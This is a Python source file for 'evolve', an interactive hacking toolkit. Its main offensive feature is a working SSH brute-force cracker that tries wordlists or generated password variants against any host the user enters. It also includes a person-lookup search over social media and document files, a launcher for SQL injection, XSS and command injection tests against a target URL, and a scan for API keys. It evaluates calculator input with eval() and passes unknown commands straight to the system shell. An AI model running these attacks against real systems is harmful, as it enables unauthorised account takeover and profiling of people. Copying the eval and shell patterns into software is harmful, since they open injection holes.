import os
import sys
import threading
import time
import requests
import pyfiglet
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import socket
import shutil
import urllib.parse
import whois
from zxcvbn import zxcvbn
import math
import re
import paramiko
from dotenv import load_dotenv

from websec import WebSec

load_dotenv()
init(autoreset=True)

loading = False


os.system("title evolve")

def calc_entropy(file_path):
    with open(file_path,'rb') as f:
        data = f.read()
        if len(data) == 0:
            return 0
        prob = [float(data.count(byte))/len(data) for byte in range(256)] 
        entropy = -sum(p*math.log2(p) for p in prob if p>0)
        return entropy 

def sys_scan():
    print(Fore.GREEN+"Scanning the system for malicious files and software...\n")

    malicious_files = []
    suspicious_extensions = ['.bat', '.vbs', '.scr', '.pif']

    for root,files in os.walk('C:\\'):  
        for file in files:
            file_path = os.path.join(root, file)
            truncated_path = (file_path[:75] + '...') if len(file_path) > 75 else file_path
            print(f"Scanning: {truncated_path}", end='\r', flush=True) 

            if any(file.endswith(ext) for ext in suspicious_extensions):
                malicious_files.append(file_path)
                entropy = calc_entropy(file_path)
                if entropy > 7.5:
                    malicious_files.append((file_path,"High Entropy"))
    print(Fore.GREEN+"\n\nSystem scan complete!")

    if malicious_files:
        print("\nPotential malicious files found:")
        for file in malicious_files:
            print(file)
    else:
        print("\nNo malicious files found.")

def love_art(evolve_art):
    terminal_width = shutil.get_terminal_size().columns
    lines = evolve_art.splitlines()
    centered_lines = []
    for line in lines:
        centered_line = line.center(terminal_width)
        centered_lines.append(centered_line)
    return "\n".join(centered_lines)

def loading_animation(task_description):
    animation = "|/-\\"
    idx = 0
    global loading
    while loading:
        print(f"\r{Fore.CYAN}{task_description} {animation[idx % len(animation)]}{Style.RESET_ALL}", end="")
        idx += 1
        time.sleep(0.1)

def hunter(name):
    query = (f'"{name}" site:instagram.com OR site:facebook.com OR filetype:pdf OR filetype:xls OR filetype:csv OR filetype:docx ')
    encoded_query = urllib.parse.quote(query)
    url = f"https://www.google.com/search?q={encoded_query}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
    }
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        links = []
        for item in soup.find_all('h3'):
            link = item.find_parent('a')['href']
            links.append(link)
        return links
    else:
        print(Fore.RED + "Error: Unable to retrieve search results." + Style.RESET_ALL)
        return []
    
def search_web(query):
    encoded_query = urllib.parse.quote(query)
    url = f"https://www.google.com/search?q={encoded_query}"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
    }

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status() 

        soup = BeautifulSoup(response.text, 'html.parser')
        results = []
        search_results = soup.find_all('div', class_='tF2Cxc')

        if not search_results:
            search_results = soup.find_all('div', class_='g')

        for item in search_results:
            title = item.find('h3').text if item.find('h3') else 'No title'
            link = item.find('a')['href'] if item.find('a') else 'No link'
            summary = 'No summary available'

            summary_tag = item.find('span', class_='aCOpRe') or item.find('div', class_='IsZvec') or item.find('div', class_='VwiC3b')
            if summary_tag:
                summary = summary_tag.text

            results.append({'title': title, 'link': link, 'summary': summary})

        if not results:
            print(Fore.RED + "No results found." + Style.RESET_ALL)
        
        return results

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error: Could not complete the search. {str(e)}" + Style.RESET_ALL)
        return []
    except Exception as e:
        print(Fore.RED + f"An unexpected error occurred: {str(e)}" + Style.RESET_ALL)
        return []

def run_script(script_path):
    if not os.path.exists(script_path):
        print(Fore.RED + f"Error: The script '{script_path}' does not exist." + Style.RESET_ALL)
        return
    if script_path.endswith('.py'):
        os.system(f'python "{script_path}"')
    elif script_path.endswith('.bat'):
        os.system(f'"{script_path}"')
    else:
        print(Fore.RED + "Error: Only python and batch scripts are supported for now." + Style.RESET_ALL)

def ip_geolocation(ip_address):
    token = os.getenv('IP_TOKEN')
    url = f"https://ipinfo.io/{ip_address}?token={token}"
    
    response = requests.get(url)
    
    if response.status_code == 200 :
        data = response.json()
        country = data.get("country", "N/A")
        city = data.get("city", "N/A")
        isp = data.get("org", "N/A")
        print(f"IP Address: {ip_address}")
        print(f"Country: {country}")
        print(f"City: {city}")
        print(f"ISP: {isp}")
    else:
        print(Fore.RED + "Error retrieving geolocation data." + Style.RESET_ALL)
        print(token)

def check_password_strength(password):
    result = zxcvbn(password)
    score = result['score']
    feedback = result['feedback']['suggestions']
    cracked_time = result['crack_times_display']['offline_fast_hashing_1e10_per_second']
    strength_levels = ["Very Weak", "Weak", "Moderate", "Strong", "Very Strong"]
    strength_level = strength_levels[score]
    return strength_level, feedback, cracked_time

def generate_combinations(keywords):
    special_chars = ['_', '@', '!', '#', '$', '%', '&', '*', '-', '+', '=', '.']
    trails = ['123', '!', '@123', '_', '', '123!']
    all_combinations = set()

    for keyword in keywords:
        if len(keyword) >= 3:
            base_variations = [
                keyword.lower(),
                keyword.upper(),
                keyword.capitalize(),
                keyword.swapcase(),
            ]

            for variation in base_variations:
                all_combinations.add(variation)

                for special_char in special_chars:
                    all_combinations.add(special_char + variation)
                    all_combinations.add(variation + special_char)

                for trail in trails:
                    all_combinations.add(variation + trail)

                for i in range(len(variation) + 1):
                    for special_char in special_chars:
                        new_combination = variation[:i] + special_char + variation[i:]
                        all_combinations.add(new_combination)

                for i in range(len(variation)):
                    for special_char in special_chars:
                        new_combination = variation[:i+1] + special_char + variation[i+1:]
                        all_combinations.add(new_combination)

                if '_' not in variation:
                    new_combination = variation.replace('', '_')[1:-1] 
                    all_combinations.add(new_combination)

        else:
            print(Fore.RED + "Keyword must atleast be a 3 word letter")

    return all_combinations

    
def read_wordlist(wordlist_file):
    with open(wordlist_file,'r') as file:
        return set(line.strip() for line in file)
    
def bruteforce(hostname, username, passwords, port=22):
    for password in passwords:
        try:
            print(Fore.CYAN + f"[*] Trying password: {password}" + Style.RESET_ALL)
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname, port=port, username=username, password=password, timeout=5)
            print(Fore.GREEN + f"[+] Success! Password found: {password}" + Style.RESET_ALL)
            return password
        except paramiko.AuthenticationException:
            print(Fore.RED + f"[-] Failed: {password}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Error: {str(e)}" + Style.RESET_ALL)
        finally:
            client.close()
    return None

def cracker():
    hostname = input(Fore.YELLOW + "Enter SSH hostname: " + Style.RESET_ALL)
    username = input(Fore.YELLOW + "Enter SSH username: " + Style.RESET_ALL)
    method = input(Fore.YELLOW + "Use wordlist or keywords (enter 'wordlist' or 'keywords'): " + Style.RESET_ALL)

    if method == 'wordlist':
        wordlist = input(Fore.YELLOW + "Enter path to wordlist: " + Style.RESET_ALL)
        passwords = read_wordlist(wordlist)
        print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords from the wordlist." + Style.RESET_ALL)
        success = bruteforce(hostname, username, passwords)
    elif method == 'keywords' or method == 'keyword':
        keywords = input(Fore.YELLOW + "Enter keywords separated by space: " + Style.RESET_ALL).split()
        passwords = generate_combinations(keywords)
        print(Fore.GREEN + f"[+] Generated {len(passwords)} password combinations." + Style.RESET_ALL)
        success = bruteforce(hostname, username, passwords)
    else:
        print(Fore.RED + "Invalid cracker command.")
        print(Fore.CYAN + "Valid commands : 'ssh brute', 'cracker create', 'quit'" + Style.RESET_ALL)

    if success:
        print(Fore.GREEN + f"[+] Password successfully found: {success}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[-] No password found. Try expanding the wordlist or keyword combinations." + Style.RESET_ALL)

def create_custom_wordlist():
    print(Fore.YELLOW + "Enter the range of numbes for the wordlist"+Style.RESET_ALL)
    start = int(input(Fore.YELLOW + "Enter starting number:" + Style.RESET_ALL))
    end = int(input(Fore.YELLOW + "Enter ending number:" + Style.RESET_ALL)) 

    wordlist = [str(i).zfill(3) for i in range(start, end+1 )]

    file_name = input(Fore.YELLOW + "Name of wordlist: " + Style.RESET_ALL) + ".txt"
    with open(file_name, 'w') as f:
        for item in wordlist:
            f.write(f"{item}\n")

    print(Fore.GREEN + f"Custom wordlist created and saved as {file_name}" + Style.RESET_ALL)


def display_help():
    help_text = """
       Commands:
         ____________________________________________________________________________________________
        | run websec          : Launches the WebSec security testing tool.                           |
        | sys scan            : Scans the system for malicious files and software.                   |
        | run hunter          : Search for a person online and relevant information.                 | 
        | search web          : Searches the web for specified keywords and returns a summary.       |
        | run cracker         : Launches the cracker tool for brute force password attacks.          |
        |       --- Subcommands for Cracker:                                                         |
        |       ssh brute         : Initiates an SSH brute force attack using a wordlist or keywords.|
        |       cracker create    : Creates a custom wordlist based on a specified range of numbers. |
        |       quit              : Exits the cracker tool and returns to the previous menu.         |
        | run script <script_path> : Executes a specified Python or Batch script directly.           |
        | cipher <password>   : Evaluates the strength of the provided password.                     |
        | geo <ip_address>    : Provides geographical information about an IP address.               |
        | calc                : Performs basic calculations.                                         |
        | clear               : Clears the command line screen.                                      |
        | exit                : Exits the evolve tool.                                               |
        |____________________________________________________________________________________________|
    """
    print(Fore.LIGHTGREEN_EX + help_text + Style.RESET_ALL)


def main():
    print("\n")
    custom_art = """
▓█████ ██▒   █▓ ▒█████   ██▓  ██▒   █▓▓█████ 
▓█   ▀▓██░   █▒▒██▒  ██▒▓██▒ ▓██░   █▒▓█   ▀ 
▒███   ▓██  █▒░▒██░  ██▒▒██░  ▓██  █▒░▒███   
▒▓█  ▄  ▒██ █░░▒██   ██░▒██░   ▒██ █░░▒▓█  ▄ 
░▒████▒  ▒▀█░  ░ ████▓▒░░██████▒▒▀█░  ░▒████▒
░░ ▒░ ░  ░ ▐░  ░ ▒░▒░▒░ ░ ▒░▓  ░░ ▐░  ░░ ▒░ ░
 ░ ░  ░  ░ ░░    ░ ▒ ▒░ ░ ░ ▒  ░░ ░░   ░ ░  ░
   ░       ░░  ░ ░ ░ ▒    ░ ░     ░░     ░   
   ░  ░     ░      ░ ░      ░  ░   ░     ░  ░
           ░                      ░          
    """
    screen_width = os.get_terminal_size().columns
    lines = custom_art.strip().split('\n')
    for line in lines:
        print(Fore.LIGHTBLUE_EX + line.center(screen_width) + Style.RESET_ALL)
    print(Fore.GREEN + "[+] " + Fore.YELLOW + "Tool created by Aditya Manohar" + Style.RESET_ALL)


    evolve__art = """
            _______________                        |*\_/*|________
            |  ___________  |     .-.     .-.      ||_/-\_|______  |
            | |           | |    .****. .****.     | |           | |
            | |   0   0   | |    .*****.*****.     | |   0   0   | |
            | |     -     | |     .*********.      | |     -     | |
            | |   \___/   | |      .*******.       | |   \___/   | |
            | |___     ___| |       .*****.        | |___________| |
            |_____|\_/|_____|        .***.         |_______________|
                _|__|/ \\|_|_.............*.............._|________|_
            / ********** \\                          / ********** \\
            /  ************  \\                      /  ************  \\
            --------------------                    --------------------
"""

    global loading

    while True:
        command = input(Fore.GREEN + "\nevolve>> " + Style.RESET_ALL).strip().lower()

        if command == "run websec":
            tester = WebSec("http://example.com")
            tester.print_custom_art()
            url = input(Fore.YELLOW + "Enter the target URL: " + Style.RESET_ALL)
            tester = WebSec(url)

            loading = True
            loading_thread = threading.Thread(target=loading_animation, args=("Retrieving WHOIS information...",))
            loading_thread.start()
            tester.get_whois_info()
            loading = False
            loading_thread.join()
            time.sleep(0.5)

            loading = True
            loading_thread = threading.Thread(target=loading_animation, args=("Scanning for open ports...",))
            loading_thread.start()
            tester.scan_open_ports()
            loading = False
            loading_thread.join() 
            time.sleep(0.5)

            loading = True
            threading.Thread(target=loading_animation, args=("Testing for SQL Injection vulnerabilities...",)).start()
            tester.test_sql_injection()
            loading = False
            time.sleep(0.5)
    
            loading = True
            threading.Thread(target=loading_animation, args=("Testing for XSS vulnerabilities...",)).start()
            tester.run_tests()
            loading = False
            time.sleep(0.5)

            loading = True
            threading.Thread(target=loading_animation, args=("Testing for CSRF vulnerabilities...",)).start()
            tester.test_csrf()
            loading = False
            time.sleep(0.5)
        
            loading = True
            threading.Thread(target=loading_animation, args=("Testing for Command Injection vulnerabilities...",)).start()
            tester.test_command_injection()
            loading = False
            time.sleep(0.5)

            loading = True
            loading_thread = threading.Thread(target=loading_animation, args=("Searching for API keys...",))
            loading_thread.start()
            api_keys = tester.find_api_keys(url)
            loading = False
            loading_thread.join()
            time.sleep(0.5)

        elif command == "sys scan":
            sys_scan()

        elif command == "run hunter":
            print(Fore.GREEN+"""
                                    ██   ██ ██    ██ ███    ██ ████████ ███████ ██████  
                                    ██   ██ ██    ██ ████   ██    ██    ██      ██   ██ 
                                    ███████ ██    ██ ██ ██  ██    ██    █████   ██████  
                                    ██   ██ ██    ██ ██  ██ ██    ██    ██      ██   ██ 
                                    ██   ██  ██████  ██   ████    ██    ███████ ██   ██
                  """)
            name = input("Enter the name : ")
            results = hunter(name)
            print(Fore.GREEN+"Search Results : "+Style.RESET_ALL)
            for link in results:
                print(Fore.LIGHTCYAN_EX+" * ",link)

        elif command == "run cracker":
            print(Fore.RED+"""                                                                       
                                    ____ ____ ____ ____ ____ ____ _____
                                    ||c |||r |||a |||c |||k |||e |||r ||
                                    ||__|||__|||__|||__|||__|||__|||__||
                                    |/__\|/__\|/__\|/__\|/__\|/__\|/__\|
                  """)
            while True:
                sub_command = input(Fore.GREEN + "cracker>>"+Style.RESET_ALL).strip().lower()

                if sub_command == "ssh brute":
                    hostname = input(Fore.YELLOW + "Enter SSH hostname: " + Style.RESET_ALL)
                    username = input(Fore.YELLOW + "Enter SSH username: " + Style.RESET_ALL)
                    method = input(Fore.YELLOW + "Use wordlist or keywords (enter 'wordlist' or 'keywords'): " + Style.RESET_ALL)

                    if method == 'wordlist':
                        wordlist = input(Fore.YELLOW + "Enter path to wordlist : " + Style.RESET_ALL)
                        passwords = read_wordlist(wordlist)
                        print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords from the wordlist." + Style.RESET_ALL)
                        success = bruteforce(hostname, username, passwords)
                    
                    elif method == 'keywords':
                        keywords = input(Fore.YELLOW+ "Enter keywords seperated by space : "+Style.RESET_ALL).split()
                        passwords = generate_combinations(keywords)
                        print(Fore.GREEN + f"[+]Generated {len(passwords)} password combinations" + Style.RESET_ALL)
                        success = bruteforce(hostname,username,passwords)

                    if success:
                        print(Fore.GREEN + f"Password successfully found: {success}" + Style.RESET_ALL)
                    else:
                        print(Fore.RED + "No password found. Try expanding the wordlist or keyword combinations." + Style.RESET_ALL)

                elif sub_command == "quit":
                    break

                elif sub_command == "cracker create":
                    create_custom_wordlist()

                else:
                    print(Fore.RED + "Invalid cracker command.")
                    print(Fore.CYAN + "Valid commands : 'ssh brute', 'cracker create', 'quit'" + Style.RESET_ALL)
     
        elif command == "search web":
            query = input("What should I search for : ")
            results = search_web(query)
            print(Fore.GREEN + "Search Results : "+Style.RESET_ALL)
            for summary in results:
                print(summary)

        elif command.startswith("run script"):
            script_path = command[len("run script "):].strip()
            run_script(script_path)

        elif command.startswith("geo "):
            ip = command.split(" ",1)[1]
            ip_geolocation(ip)

        elif command.startswith("cipher"):
            password = command[len("cipher"):].strip()
            if password:
                strength_level, feedback, cracked_time = check_password_strength(password)
                print(Fore.GREEN + f"Password Strength: {strength_level}" + Style.RESET_ALL)
                print(Fore.YELLOW + f"Crack Time: {cracked_time}" + Style.RESET_ALL)
                if feedback:
                    print(Fore.RED + "Suggestions:" + Style.RESET_ALL)
                    for suggestion in feedback:
                        print(f"{suggestion}")
            else:
                print(Fore.RED + "Error: No password provided." + Style.RESET_ALL)

        elif command == "calc":
            while True:
                expression = input(Fore.GREEN + "calc>>" + Style.RESET_ALL)

                if expression.lower() == "quit":
                    break
                try:
                    result = eval(expression)
                    print(Fore.CYAN + f"{result}"+Style.RESET_ALL)
                except Exception as e:
                    print(Fore.RED + "Enter valid input for calculation")

        elif command == "who are you":
            print("I'm evolve :)")

        elif command == "love" or command == "evol":
            print(evolve__art)

        elif command == "evolve":
            screen_width = os.get_terminal_size().columns
            lines = custom_art.strip().split('\n')
            for line in lines:
                print(Fore.LIGHTBLUE_EX + line.center(screen_width) + Style.RESET_ALL)

        elif command == "help":
            display_help()

        elif command == "evolve -help" or command == "evolve -h":
            display_help()

        elif command == "clear":
            os.system('cls')
        
        elif command == "exit":
            sys.exit()
        else:
            exit_code = os.system(command)
            if exit_code != 0 :
                print(Fore.RED + f"{command} not found. Try evolve --help")

if __name__ == "__main__":
    main()
